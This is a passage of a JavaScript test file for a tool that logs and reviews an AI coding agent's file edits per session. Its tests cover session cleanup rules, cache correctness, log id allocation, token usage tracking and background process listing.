  // review; a month in, nobody is coming back and its edits are discarded with it. Without this second
  // clause almost nothing qualifies on a real store — most old sessions were never reviewed to the end.
  assert.ok(!core.reapableSessions(ws).some((s) => s.id === 'sPending'), 'a 2-day-old session with pending edits is spared');
  age('sPending', 30 * 24 * HOUR);
  const ab = core.reapableSessions(ws).find((s) => s.id === 'sPending');
  assert.ok(ab, 'a month-dead session with pending edits IS reaped');
  assert.equal(ab.reason, 'abandoned', 'and is reported as abandoned, so the UI can warn what it discards');
  assert.equal(ab.pending, 1, 'carrying the count of unreviewed edits that go with it');
  // …and the threshold is caller-controllable, because "too old" is a judgement, not a constant.
  assert.ok(
    !core.reapableSessions(ws, Date.now(), 60 * 24 * HOUR).some((s) => s.id === 'sPending'),
    'a longer stale window spares it again'
  );
  age('sPending', 48 * HOUR); // back under the window, so the CLI assertions below still see one target

  const store = (id) => fs.existsSync(path.join(core.rootDir(), id));
  const out = JSON.parse(
    cp.execFileSync('node', [CLI, 'clean', '--completed', '--json'], {
      env: { ...process.env, HOME: home, USERPROFILE: home },
      cwd: ws,
      encoding: 'utf8',
    })
  );
  assert.deepEqual(out.dropped, ['sDone'], 'the CLI drops exactly that one');
  assert.equal(store('sDone'), false, 'its store is gone');
  for (const kept of ['sCurrent', 'sPending', 'sStaged']) {
    assert.equal(store(kept), true, `${kept} survives`);
  }
});

test('clean: --completed never reaps a session recorded for an ANCESTOR workspace (0.9.0)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  // A session launched in a PARENT directory — ~, ~/Github, a monorepo root are all ordinary launch
  // dirs. `findTranscript` walks up to the filesystem root, so such a session resolves from a
  // subdirectory and used to be deleted by a clear run there. Listing it is fine; deleting it is not.
  const parent = fs.realpathSync(tmpWork());
  const sub = path.join(parent, 'packages', 'thing');
  fs.mkdirSync(sub, { recursive: true });
  const old = (Date.now() - 48 * 3_600_000) / 1000;
  const seed = (cwd, id) => {
    const proj = core.projectDir(cwd);
    fs.mkdirSync(proj, { recursive: true });
    const p = path.join(proj, id + '.jsonl');
    fs.writeFileSync(
      p,
      [
        JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', cwd, message: { role: 'user', content: id } }),
        JSON.stringify({ timestamp: new Date(1100).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'a-' + id, content: [{ type: 'text', text: 'ok' }] } }),
      ].join('\n') + '\n'
    );
    core.ensureStore(id);
    const f = path.join(cwd, id + '.ts');
    fs.writeFileSync(f, 'one\n');
    core.appendLog(id, { tool: 'Edit', file: f, before: null, after: null, added: 1, removed: 0, status: 'kept', ts: 1200 });
    fs.utimesSync(p, old, old);
  };
  seed(parent, 'ancestorSess');
  seed(sub, 'subDone');
  seed(sub, 'subCurrent');
  // Make subCurrent the newest so it is `current` and cannot be the one under test.
  const now = Date.now() / 1000;
  fs.utimesSync(path.join(core.projectDir(sub), 'subCurrent.jsonl'), now, now);

  const reapable = core.reapableSessions(sub).map((s) => s.id);
  assert.deepEqual(reapable, ['subDone'], 'only this workspace’s finished session is reapable');
  // POSITIVE CONTROL: the ancestor session IS resolvable from here — that is exactly why the naive
  // provenance rail let it through. If this fails, the fixture is not reproducing the hazard.
  assert.ok(core.findTranscript(sub, 'ancestorSess'), 'the ancestor session does resolve from the subdirectory');
  assert.ok(
    core.sessionMeta(sub).sessions.some((r) => r.id === 'ancestorSess'),
    'and it is even LISTED here — listing is fine, deleting is not'
  );
});

test('clean: --older-than never deletes the session the user is in (0.9.0)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork()); // the CLI child reports the resolved cwd — see the note above
  const proj = core.projectDir(ws);
  fs.mkdirSync(proj, { recursive: true });
  const S = 'liveLong';
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [
      JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', cwd: ws, message: { role: 'user', content: 'hi' } }),
      JSON.stringify({ timestamp: new Date(1100).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'a1', content: [{ type: 'text', text: 'ok' }] } }),
    ].join('\n') + '\n'
  );
  core.ensureStore(S);
  const f = path.join(ws, 'a.ts');
  fs.writeFileSync(f, 'one\n');
  core.appendLog(S, { tool: 'Edit', file: f, before: null, after: null, added: 1, removed: 0, status: 'pending', ts: 1200 });
  // A long conversation that made all its edits early: the STORE LOG is ancient while the session is
  // very much alive. That is the shape --older-than used to delete out from under the user.
  const old = (Date.now() - 30 * 86400000) / 1000;
  fs.utimesSync(core.logPath(S), old, old);

  const run = (args) =>
    JSON.parse(cp.execFileSync('node', [CLI, ...args], { env: { ...process.env, HOME: home, USERPROFILE: home }, cwd: ws, encoding: 'utf8' }));
  assert.equal(core.resolveSessionId(ws), S, 'it is the current session');
  assert.deepEqual(run(['clean', '--older-than', '7d', '--json']).dropped, [], 'the live session is not swept up');
  assert.equal(fs.existsSync(core.logPath(S)), true, 'its store survives');

  // POSITIVE CONTROL: the verb still works. An identical but NON-current session is still dropped,
  // so this is a targeted exclusion and not a broken --older-than.
  const O = 'deadOne';
  fs.writeFileSync(path.join(proj, O + '.jsonl'), JSON.stringify({ timestamp: new Date(900).toISOString(), type: 'user', cwd: ws, message: { role: 'user', content: 'old' } }) + '\n');
  core.ensureStore(O);
  core.appendLog(O, { tool: 'Edit', file: f, before: null, after: null, added: 1, removed: 0, status: 'kept', ts: 1000 });
  fs.utimesSync(core.logPath(O), old, old);
  assert.deepEqual(run(['clean', '--older-than', '7d', '--json']).dropped, [O], 'a dead session with the same age still goes');
});

test('taskLog: the cross-agent log reads the sibling CACHE, never the raw builder (0.9.0)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork());
  fs.mkdirSync(path.join(ws, '.git'), { recursive: true });
  const proj = core.projectDir(ws);
  fs.mkdirSync(proj, { recursive: true });
  const S = 'tlSess';
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [
      JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', cwd: ws, message: { role: 'user', content: 'do the work' } }),
      JSON.stringify({ timestamp: new Date(1100).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'a1', content: [{ type: 'text', text: 'ok' }] } }),
    ].join('\n') + '\n'
  );
  core.ensureStore(S);
  const f = path.join(ws, 'a.ts');
  fs.writeFileSync(f, 'one\n');
  core.appendLog(S, { tool: 'Edit', file: f, before: null, after: null, added: 1, removed: 0, status: 'pending', ts: 1200 });

  // The instrument: `siblingChangeMap` PERSISTS its result, and the raw `buildChangeMap` writes nothing.
  // So a cache entry appearing after this call is proof of which door was used — and the log rebuilt
  // every sibling from scratch on every run before this, 12.4 s on a repo with 31 of them.
  const cacheDir = path.join(core.rootDir(), 'changemap-cache', S);
  assert.equal(fs.existsSync(cacheDir), false, 'nothing cached yet (baseline)');
  core.crossAgentTaskLog(ws);
  assert.ok(
    // The 16-hex payload name is the SIBLING SLOT's signature — 'any .json but placements' was a
    // never-fail door: the raw builder writes deltas.json into the same dir, so both implementations
    // satisfied it (proven by reinstating the raw-builder mutation, which passed).
    fs.existsSync(cacheDir) && fs.readdirSync(cacheDir).some((n) => /^[0-9a-f]{16}\.json$/.test(n)),
    'the task log went through the caching path'
  );
});

test('memory: fileMemory indexes the store once, and a new edit still invalidates it (0.9.0)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = tmpWork();
  const f = path.join(ws, 'shared.ts');
  fs.writeFileSync(f, 'one\n');
  // Two sessions touching ONE file: fileMemory's whole job is aggregating across them, and the index
  // rewrite must not lose that.
  core.ensureStore('memA');
  core.appendLog('memA', { tool: 'Edit', file: f, before: null, after: null, added: 1, removed: 0, status: 'kept', ts: 1000 });
  core.ensureStore('memB');
  core.appendLog('memB', { tool: 'Edit', file: f, before: null, after: null, added: 1, removed: 0, status: 'undone', ts: 2000 });

  const m1 = core.fileMemory(f);
  assert.deepEqual(
    { edits: m1.edits, kept: m1.kept, undone: m1.undone, pending: m1.pending },
    { edits: 2, kept: 1, undone: 1, pending: 0 },
    'both sessions are folded into one history'
  );
  assert.deepEqual(m1.lastVerdict, { status: 'undone', ts: 2000 }, 'the newest verdict wins');

  // The index is memoized on the log files. A memo that did not notice a new edit would report the old
  // counts forever — the failure mode this rewrite could plausibly introduce, so assert it directly.
  core.appendLog('memA', { tool: 'Edit', file: f, before: null, after: null, added: 5, removed: 0, status: 'pending', ts: 3000 });
  const m2 = core.fileMemory(f);
  assert.equal(m2.edits, 3, 'a new edit invalidates the index');
  assert.equal(m2.pending, 1, '...and lands in the right bucket');

  // A file nobody has touched has an empty history, not a crash or a neighbour's numbers.
  assert.equal(core.fileMemory(path.join(ws, 'never-edited.ts')).edits, 0, 'an unknown file is empty');
});

test('observe: session line deltas are cached per blob PAIR, so a wrong total can never be inherited (0.9.0)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = tmpWork();
  const S = 'deltaSess';
  const f = path.join(ws, 'a.ts');
  fs.writeFileSync(f, 'one\n');
  const add = (before, after) => seedEdit(S, f, before, after);
  add('a\n', 'a\nb\n'); // +1
  add('a\nb\n', 'a\nb\nc\n'); // +1
  const sidecar = () => JSON.parse(fs.readFileSync(path.join(core.rootDir(), 'session-meta', S + '.json'), 'utf8'));
  const full = () => {
    let a = 0, r = 0;
    for (const rec of core.readLog(S)) { const d = core.lineDelta(S, rec); a += d.added; r += d.removed; }
    return { added: a, removed: r };
  };

  let c = core.sessionCounts(S);
  assert.deepEqual({ added: c.added, removed: c.removed }, full(), 'the first pass matches a full sum');
  const cacheFile = path.join(core.rootDir(), 'changemap-cache', S, 'deltas.json');
  assert.ok(fs.existsSync(cacheFile), 'the per-blob-pair delta cache was written');

  add('a\nb\nc\n', 'a\nb\nc\nd\n');
  c = core.sessionCounts(S);
  assert.deepEqual({ added: c.added, removed: c.removed }, full(), 'a grown log still matches a full sum');

  // The cache is keyed by CONTENT — the record's before AND after blob shas, as a PAIR. Two records with
  // the same pair share one entry…
  add('a\n', 'a\nb\n'); // identical blob pair to the very first edit
  // …and, the case that actually pins the key: the same AFTER reached from a different BEFORE is a
  // different edit with a different delta. Keyed on the after alone (four distinct afters mapping 1:1
  // onto the pairs) every count above still agreed, so that mis-key shipped green.
  add('a\nb\nc\nd\ne\nf\n', 'a\nb\nc\n'); // same after as edit #2, but removes three lines instead of adding one
  core.sessionCounts(S);
  const pairs = JSON.parse(fs.readFileSync(cacheFile, 'utf8')).pairs;
  assert.equal(Object.keys(pairs).length, 4, 'five records, four distinct blob PAIRS — identical edits collapse, a shared after does not');
  const c2 = core.sessionCounts(S);
  assert.deepEqual({ added: c2.added, removed: c2.removed }, full(), 'and a shared after keeps its own delta');
  assert.ok(c2.removed > 0, 'the fixture really does exercise a removal, not only additions');

  // A wrong cached TOTAL must not be permanent. This is why a running total was rejected: resuming from
  // one is inheriting it, so a single bad write is never recomputed and the number is frozen for good
  // (observed for real: 0 over 2,800 edits). Here the sum is rebuilt in full on the next log change, so
  // a bad value is bounded by one edit rather than forever.
  // A delta computed from a blob that could not be READ must never be cached. blobText returns '' for a
  // missing snapshot so rendering degrades instead of crashing — which makes lineDelta report a plausible
  // wrong number, filed under the INTACT sha. Content-keying makes a hit exact only when the content was
  // actually there, and nothing would ever heal it, because the key never changes.
  const gone = add('p\nq\nr\n', 'p\n'); // a removal, so a lost `before` changes the answer visibly
  const rec = core.readLog(S).find((x) => x.id === gone);
  const pairKey = `${rec.beforeBlob}:${rec.afterBlob}`;
  const blob = path.join(core.rootDir(), S, 'blobs', rec.beforeBlob);
  const stampBefore = sidecar().countsStamp;
  const blobBytes = fs.readFileSync(blob);
  fs.rmSync(blob);
  core.sessionCounts(S); // computes from an unreadable blob — allowed to be wrong, must not be STORED
  // Assert the FILE, not the returned number: `full()` recomputes through lineDelta, whose in-process
  // memo is poisoned by the very same failed read, so oracle and cache agree on the wrong value and any
  // comparison between them passes either way. The stored entry is the only uncontaminated witness.
  const stored = JSON.parse(fs.readFileSync(cacheFile, 'utf8')).pairs;
  assert.ok(!(pairKey in stored), 'a delta computed from an unreadable blob is never written to the cache');
  // …and neither is the AGGREGATE it feeds. The sidecar's stamp covers the LOG only, but added/removed
  // come from BLOBS — so a sum derived from a snapshot this session could not read would be filed under
  // a stamp that, for a finished session, never moves again. Leaving the sidecar untouched is what makes
  // "wrong is bounded by one edit" true of the total and not just of the per-pair entries.
  assert.equal(sidecar().countsStamp, stampBefore,
    'an incomplete pass leaves the sidecar alone rather than freezing a guess under a log-only stamp');
  fs.writeFileSync(blob, blobBytes); // the snapshot comes back — and with it a persistable pass
  core.sessionCounts(S);
  assert.notEqual(sidecar().countsStamp, stampBefore, 'positive control: a COMPLETE pass does write the sidecar');

  const poisoned = { ...sidecar(), counts: { ...sidecar().counts, added: 0, removed: 0 } };
  fs.writeFileSync(path.join(core.rootDir(), 'session-meta', S + '.json'), JSON.stringify(poisoned));
  assert.equal(core.sessionCounts(S).added, 0, 'a current stamp is still served from cache (it is a cache)');
  add('a\nb\nc\nd\n', 'a\nb\nc\nd\ne\n'); // the log moves on
  c = core.sessionCounts(S);
  assert.deepEqual({ added: c.added, removed: c.removed }, full(), 'and the next change heals it completely');
  assert.notEqual(c.added, 0, 'the poisoned zero did not survive');
});

test('changemap: the GC reclaims cache payloads from a superseded version, and spares the live ones (0.9.0)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'staleMaps';
  const cwd = fs.realpathSync(tmpWork());
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'),
    JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', cwd, message: { role: 'user', content: 'go' } }) + '\n');
  seedEdit(S, path.join(cwd, 'a.ts'), 'x\n', 'y\n');
  // Write the live entry with the REAL writer, and read the current version back out of it. Hand-writing
  // a fixture and hard-coding "2" is what this test did, which tied it to nothing: the GC's version rule
  // and the writer's version could drift apart and only the fixture would notice, and a version bump
  // failed the test rather than the code. The version is an implementation detail of the writer — the
  // GC's contract is "spare what the writer just made, reclaim what it superseded".
  core.cachedChangeMap(cwd, S, { root: cwd, prompts: true });
  const dir = path.join(core.rootDir(), 'changemap-cache', S);
  const live = fs.readdirSync(dir).filter((f) => /^[0-9a-f]{16}\.json$/.test(f));
  assert.equal(live.length, 1, 'positive control: the real writer produced exactly one map payload');
  const version = Number(JSON.parse(fs.readFileSync(path.join(dir, live[0]), 'utf8')).stamp.split('|')[0]);
  assert.ok(Number.isInteger(version) && version >= 1, `the live entry carries a version (got ${version})`);
  const write = (name, stamp) => fs.writeFileSync(path.join(dir, name), JSON.stringify({ stamp, map: { summary: {} } }));
  write('0123456789abcdef.json', `${version - 1}|t|l|p|d`); // superseded
  write('fedcba9876543210.json', `${version - 1}|t|l|-|d`); // superseded
  fs.writeFileSync(path.join(dir, 'placements.json'), JSON.stringify({ version: 1, entries: {} }));
  fs.writeFileSync(path.join(dir, 'deltas.json'), JSON.stringify({ version: 1, pairs: {} }));

  const r = core.pruneStaleMaps(S);
  assert.equal(r.removed, 2, 'both superseded payloads are reclaimed');
  assert.ok(r.bytes > 0, 'and their bytes are reported');
  const left = fs.readdirSync(dir).sort();
  // The sibling caches are content-keyed with their own version fields — a name-based sweep must not
  // touch them, or the GC would silently delete the two caches this release exists to add.
  assert.deepEqual(left, [live[0], 'deltas.json', 'placements.json'].sort(), 'the live map and both sibling caches survive');
  assert.equal(core.pruneStaleMaps(S).removed, 0, 'a second sweep finds nothing (it is not re-reaping)');
  assert.deepEqual(core.pruneStaleMaps('noSuchSession'), { removed: 0, bytes: 0 }, 'a session with no cache is not an error');
});

test('observe: a session row and the change map agree about pending and ±lines (0.9.0)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'agreeSess';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', cwd, message: { role: 'user', content: 'go' } }) + '\n'
  );
  const f = path.join(cwd, 'a.ts');
  const v1 = 'one\n';
  const v2 = 'one\ntwo\n';
  const v3 = 'one\ntwoX\n';
  const v4 = 'one\ntwoXY\n';
  fs.writeFileSync(f, v4);
  // SAME-CODE edits: a perfect CHAIN where each edit rewrites the line the previous one produced, which
  // is what `reviewEdits` collapses into a single review unit. A raw record count and a display-unit
  // count therefore diverge here — exactly how the Sessions row came to say 5,198 pending while the
  // Overview's summary bar said 3,609 for the same session.
  seedEdit(S, f, v1, v2);
  seedEdit(S, f, v2, v3);
  seedEdit(S, f, v3, v4);

  const raw = core.readLog(S).filter((r) => r.status === 'pending').length;
  const counts = core.sessionCounts(S);
  const map = core.cachedChangeMap(cwd, S, { root: cwd });
  assert.ok(raw > counts.pending, 'the fixture really does collapse (otherwise this proves nothing)');
  assert.equal(counts.pending, map.summary.pending, 'the row and the map agree about pending');
  assert.equal(counts.added, map.summary.added, '…and about added lines');
  assert.equal(counts.removed, map.summary.removed, '…and about removed lines');

  // EVERY surface that reports "how many edits / how many pending" must answer with the same number.
  // These are five independent implementations over the same log, and before 0.9.0 three of them
  // counted raw records while the change map counted collapsed units — so Stats, the Prompts rollup,
  // the summary and the session row could each print a different total for one session.
  const metrics = core.sessionMetrics(cwd, S);
  const summary = core.reviewSummary(S);
  const asks = core.sessionPrompts(cwd, S);
  const askPending = asks.reduce((n, a) => n + (a.pending || 0), 0);
  assert.equal(metrics.edits.pending, counts.pending, 'metrics agrees');
  assert.equal(metrics.edits.count, map.summary.units, 'metrics counts display units, not raw records');
  // No `?? counts.pending` fallback: it made the assertion satisfy itself the moment reviewSummary stopped
  // emitting `pending`, which is precisely the regression it is here to catch.
  assert.equal(summary.pending, counts.pending, 'the review summary agrees');
  assert.equal(askPending, counts.pending, 'the per-ask rollup agrees');
  assert.ok(
    core.heuristicSuggestions(S).some((s) => s.startsWith(`${counts.pending} edit(s) still pending`)),
    'and the suggestion text quotes the same number'
  );
});

test('store: a bulk status change is one parse and one append, and skips no-ops (0.8.8)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'bulkKeep';
  core.ensureStore(S);
  const lp = path.join(core.storeDir(S), 'log.jsonl');
  const N = 4000;
  const lines = [];
  for (let id = 1; id <= N; id++)
    lines.push(JSON.stringify({ id, ts: 1000 + id, tool: 'Edit', file: '/w/f' + (id % 30) + '.ts', added: 1, removed: 0, status: 'pending' }));
  fs.writeFileSync(lp, lines.join('\n') + '\n');

  // Per-edit setStatus re-resolves the record through readLog, whose memo its own append invalidates —
  // quadratic, and unusable at the size a real session reaches. The bulk path parses once.
  const before = fs.statSync(lp).size;
  const t0 = Date.now();
  const changed = core.setStatusMany(S, core.readLog(S).map((r) => r.id), 'kept');
  const ms = Date.now() - t0;
  assert.equal(changed.length, N, 'every pending edit changed');
  assert.ok(ms < 2000, `accepting ${N} edits stays interactive (took ${ms}ms)`);
  assert.equal(core.readLog(S).filter((r) => r.status === 'kept').length, N, 'and the log reads back kept');

  // A second Accept All must be a no-op, not another N ops appended: a log that doubles on every
  // repeated bulk action is how a session's store runs away.
  const after = fs.statSync(lp).size;
  assert.deepEqual(core.setStatusMany(S, core.readLog(S).map((r) => r.id), 'kept'), [], 'nothing left to change');
  assert.equal(fs.statSync(lp).size, after, 'and nothing was written');
  assert.ok(after > before, 'the first pass did append its ops');

  // Clearing the resolved set then leaves an empty log rather than a rewritten one.
  assert.equal(core.clearResolved(S), N, 'clear drops exactly the resolved edits');
  assert.equal(core.readLog(S).length, 0, 'the log is empty afterwards');
});

test('store: nextId reads the log TAIL past 64 KB and still agrees with a full parse (0.8.8)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'tailIds';
  core.ensureStore(S);
  const lp = path.join(core.storeDir(S), 'log.jsonl');
  // Grow the log past the 64 KB threshold the fast path is gated on — asserted, never assumed from a
  // record count, because the record size is not this test's business.
  let n = 0;
  while (!fs.existsSync(lp) || fs.statSync(lp).size <= 64 * 1024) {
    core.appendLog(S, {
      tool: 'Edit', file: '/w/f' + (n % 7) + '.ts', before: null, after: null,
      added: 1, removed: 0, status: 'pending', ts: 1000 + n, reason: 'x'.repeat(180),
    });
    n++;
    assert.ok(n < 5000, 'the log should cross 64 KB long before this');
  }
  assert.ok(fs.statSync(lp).size > 64 * 1024, 'the fast path is actually exercised (log is past 64 KB)');

  // The tail read must agree with the full parse it replaces — the whole point is that it is a
  // shortcut, not a different answer.
  const full = core.readLog(S);
  const maxId = full.reduce((m, r) => Math.max(m, r.id), 0);
  assert.equal(core.nextId(S), maxId + 1, 'the tail read returns the same next id a full parse would');

  // …and a capture on top of it lands at that id, with no gap and no reuse.
  const rec = core.appendLog(S, {
    tool: 'Edit', file: '/w/after.ts', before: null, after: null,
    added: 1, removed: 0, status: 'pending', ts: 2_000_000,
  });
  assert.equal(rec.id, maxId + 1, 'the appended record takes the id the tail read predicted');
  const reread = core.readLog(S);
  assert.equal(new Set(reread.map((r) => r.id)).size, reread.length, 'no id is reused');

  // A status op appended after the last edit does NOT carry an id — the tail must skip ops, or the
  // next capture would collide with an existing edit.
  core.setStatus(S, rec.id, 'kept');
  assert.equal(core.nextId(S), rec.id + 1, 'trailing status ops do not disturb the id sequence');
});

test('store: a 64 KB tail of nothing but status ops never yields an id an edit already owns (0.8.8)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'tailOps';
  core.ensureStore(S);
  const lp = path.join(core.storeDir(S), 'log.jsonl');
  // The shape the tail read has to survive, written directly because a session reaches it only after
  // thousands of reviews: a few edits, then status ops all the way down. The ops carry the ids of the
  // edits they resolve, ASCENDING and ending far below the highest edit id — so a reader that does not
  // skip ops sees a perfectly monotonic sequence, trusts it, and hands back an id that is already taken.
  const EDITS = 2000;
  const OPS = 1400; // reviewed oldest-first, so their ids ascend and stop well below the newest edit
  const edits = [];
  for (let id = 1; id <= EDITS; id++)
    edits.push(JSON.stringify({ id, ts: 1000 + id, tool: 'Edit', file: '/w/f' + (id % 9) + '.ts', added: 1, removed: 0, status: 'pending' }));
  const ops = [];
  for (let id = 1; id <= OPS; id++)
    ops.push(JSON.stringify({ op: 'status', id, status: 'kept', ts: 9_000_000 + id }));
  fs.writeFileSync(lp, edits.concat(ops).join('\n') + '\n');
  assert.ok(fs.statSync(lp).size > 64 * 1024, 'the log is past the tail-read threshold');
  // The last 64 KB must be ops ONLY — otherwise an edit id in the tail would give the right answer for
  // the wrong reason, and this test would pass against a reader that ignores the op marker.
  const tail = fs.readFileSync(lp).subarray(-64 * 1024).toString('utf8').split('\n').slice(1).filter(Boolean);
  assert.ok(tail.every((l) => JSON.parse(l).op === 'status'), 'the tail read will see nothing but status ops');
  assert.ok(tail.length > 2, 'and enough of them for the fast path to trust the sequence');

  // Proof that the FAST PATH answered, not the fallback: count the bytes the call reads. The tail read
  // takes one 64 KB window; a full parse reads the whole file, which here is several times that.
  const realRead = fs.readSync;
  let bytesRead = 0;
  fs.readSync = function (...args) {
    const n = realRead.apply(fs, args);
    bytesRead += n;
    return n;
  };
  let answer;
  try {
    answer = core.nextId(S);
  } finally {
    fs.readSync = realRead;
  }
  assert.ok(bytesRead <= 64 * 1024, `the tail shortcut answered (read ${bytesRead} bytes, not the whole ${fs.statSync(lp).size})`);
  assert.equal(answer, EDITS + 1, 'the next id follows the highest EDIT, not the last status op');
  const rec = core.appendLog(S, {
    tool: 'Edit', file: '/w/after.ts', before: null, after: null, added: 1, removed: 0, status: 'pending', ts: 9_900_000,
  });
  assert.equal(rec.id, EDITS + 1, 'the capture takes that id');
  const ids = core.readLog(S).map((r) => r.id);
  assert.equal(new Set(ids).size, ids.length, 'and no edit id is reused');
});

test('store: a non-increasing tail falls back to the full parse rather than trusting it (0.8.8)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'tailDup';
  core.ensureStore(S);
  const lp = path.join(core.storeDir(S), 'log.jsonl');
  // Ids are strictly increasing in a healthy log, so the tail read trusts a sequence only while it
  // stays that way. Two interleaved writers (or a partially-written line) can break that, and the
  // shortcut must then defer to the full parse instead of returning the last id it happened to see.
  const lines = [];
  for (let id = 1; id <= 1500; id++)
    lines.push(JSON.stringify({ id, ts: 1000 + id, tool: 'Edit', file: '/w/f' + (id % 9) + '.ts', added: 1, removed: 0, status: 'pending' }));
  // …then one id repeated out of order, at the very end — inside the window the fast path reads.
  lines.push(JSON.stringify({ id: 900, ts: 99_999, tool: 'Edit', file: '/w/dup.ts', added: 1, removed: 0, status: 'pending' }));
  fs.writeFileSync(lp, lines.join('\n') + '\n');
  assert.ok(fs.statSync(lp).size > 64 * 1024, 'the log is past the tail-read threshold');
  // A tail that trusted its last id would answer 901 and hand the next capture an id three records
  // deep in the log. It defers instead, and the full parse reconciles the repeat to a fresh id (1501),
  // so the next one is 1502 — the duplicate is repaired rather than propagated.
  const full = core.readLog(S);
  assert.equal(full.length, 1501, 'every record survives — the duplicate is renumbered, not dropped');
  assert.equal(new Set(full.map((r) => r.id)).size, full.length, 'and the ids are unique afterwards');
  assert.equal(core.nextId(S), 1502, 'the next id follows the reconciled maximum, not the tail');
});

test('metrics: the usage cursor survives across processes — a cold reader delta-parses instead of re-reading (0.8.6)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'usagePersist';
  // realpath: on macOS os.tmpdir() hands back /var/… while a child process's cwd resolves to
  // /private/var/…, and the two mangle into different project-dir names — the transcript would be
  // written where the subprocess never looks.
  const cwd = fs.realpathSync(tmpWork());
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const file = path.join(proj, S + '.jsonl');
  const line = (id, n, ts) =>
    JSON.stringify({ timestamp: ts, message: { role: 'assistant', id, model: 'claude-opus-4-8', usage: { input_tokens: n, output_tokens: n, cache_read_input_tokens: n, cache_creation_input_tokens: 0 }, content: [] } });
  // Real separate processes, because that IS the case being fixed: the status line runs one CLI per
  // prompt and the JetBrains stats poll one per tick, so an in-memory cursor never survives to help
  // them — only the persisted one does.
  const env = { ...process.env, HOME: home, USERPROFILE: home };
  const usage = () => JSON.parse(cp.execFileSync('node', [CLI, 'usage', '--session', S], { env, cwd, encoding: 'utf8' }));

  fs.writeFileSync(file, line('p1', 10, '2026-07-15T10:00:00.000Z') + '\n');
  assert.equal(usage().sessionTokens.input, 10, 'first (cold) process parses the whole file');

  fs.appendFileSync(file, line('p2', 5, '2026-07-15T10:05:00.000Z') + '\n');
  const second = usage();
  assert.equal(second.sessionTokens.input, 15, 'the next process resumes from the persisted totals and adds only the new turn');
  assert.equal(second.sessionTokens.output, 15, 'every counter carries forward, not just input');
  assert.equal(second.vitals.model.label, 'Opus 4.8', 'vitals ride the same persisted state');

  // A message id repeated far from its first appearance (a resumed session re-emitting earlier turns)
  // must not count twice — which is why the whole seen-set is persisted, not a last-id shortcut.
  fs.appendFileSync(file, line('p1', 10, '2026-07-15T10:09:00.000Z') + '\n');
  assert.equal(usage().sessionTokens.input, 15, 'a far-apart duplicate id is still deduped across processes');

  // A replaced (shrunken) transcript must invalidate rather than serve stale totals.
  fs.writeFileSync(file, line('q1', 3, '2026-07-15T11:00:00.000Z') + '\n');
  assert.equal(usage().sessionTokens.input, 3, 'a replaced transcript rescans from zero');
});

test('processes: background shells are reconstructed with runtime, exit code and output (0.8.7)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'bgProc';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const outFile = path.join(cwd, 'job.output');
  fs.writeFileSync(outFile, 'some output\n');
  // Verbatim record shapes: the spawn is a Bash tool_use with run_in_background, the result names the
  // shell in toolUseResult.backgroundTaskId, and the completion arrives as its own `queue-operation`
  // record carrying a <task-notification> block — which has no `message` at all.
  const spawn = (id, cmd, desc, ts) =>
    JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'assistant', message: { role: 'assistant', content: [{ type: 'tool_use', id, name: 'Bash', input: { command: cmd, description: desc, run_in_background: true } }] } });
  const result = (id, bg, ts) =>
    JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', toolUseResult: { backgroundTaskId: bg }, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, content: `Command running in background with ID: ${bg}. Output is being written to: ${outFile}. You will be notified.` }] } });
  const done = (bg, ts, code) =>
    JSON.stringify({ type: 'queue-operation', operation: 'enqueue', timestamp: new Date(ts).toISOString(), content: `<task-notification> <task-id>${bg}</task-id> <status>completed</status> <summary>Background command "job" completed (exit code ${code})</summary> </task-notification>` });

  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [
      spawn('t1', 'npm test', 'Run the suite', 1000),
      result('t1', 'shellA', 1100),
      done('shellA', 61000, 0),
      spawn('t2', 'tail -f log', 'Watch the log', 2000),
      result('t2', 'shellB', 2100),
      // a foreground Bash must NOT appear
      JSON.stringify({ timestamp: new Date(3000).toISOString(), type: 'assistant', message: { role: 'assistant', content: [{ type: 'tool_use', id: 't3', name: 'Bash', input: { command: 'ls' } }] } }),
    ].join('\n') + '\n'
  );

  const list = core.sessionProcesses(cwd, S, 92000); // pin "now" so the live runtime is deterministic
  assert.equal(list.length, 2, 'only backgrounded shells are listed — a foreground Bash is not a process');
  // Running first: the Processes tab leads with the shell you might still act on. Look rows up by id
  // rather than position so this assertion states identity, not ordering.
